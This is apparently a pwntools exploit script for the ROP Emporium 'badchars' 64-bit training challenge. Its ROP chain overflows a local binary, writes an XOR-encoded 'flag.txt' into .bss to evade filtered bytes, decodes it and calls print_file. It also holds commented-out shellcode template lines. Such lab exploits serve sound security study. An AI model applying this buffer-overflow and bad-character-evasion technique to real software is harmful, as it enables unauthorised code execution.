#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /home/batman/CTFs/ropemporium/badchars/64/badchars
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/home/batman/CTFs/ropemporium/badchars/64/badchars')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x00000000004006a0
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'
bss=0x0000000000601038
pad=b"C"*40
rop=ROP(exe)
rop.raw(0x000000000040069c) # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
rop.raw('%/"$m7;7') # flag.txt xor 0x43
rop.raw(bss) # bss address
rop.raw('CCCCCCCC') # C/0x43 that will be xored with the input
rop.raw(bss)
rop.raw(0x0000000000400634) # mov qword ptr [r13], r12 ; ret
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.raw(0x00000000004006a2) # pop r15 ; ret
rop.raw(bss+1)
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.raw(0x00000000004006a2) # pop r15 ; ret
rop.raw(bss+2)
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.raw(0x00000000004006a2) # pop r15 ; ret
rop.raw(bss+3)
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.raw(0x00000000004006a2) # pop r15 ; ret
rop.raw(bss+4)
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.raw(0x00000000004006a2) # pop r15 ; ret
rop.raw(bss+5)
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.raw(0x00000000004006a2) # pop r15 ; ret
rop.raw(bss+6)
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.raw(0x00000000004006a2) # pop r15 ; ret
rop.raw(bss+7)
rop.raw(0x0000000000400628) # xor byte ptr [r15], r14b ; ret
rop.print_file(bss)
payload=(
    pad+rop.chain()

)
# payload1=(
#     pad+rop1.chain()+b"A"*20
# )
log.info("ROP chain 1:"+rop.dump())
# log.info("ROP chain 2:"+rop1.dump())

io = start()
io.sendline(payload)
print(io.recv(1028).decode())

# io.sendline(payload1)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

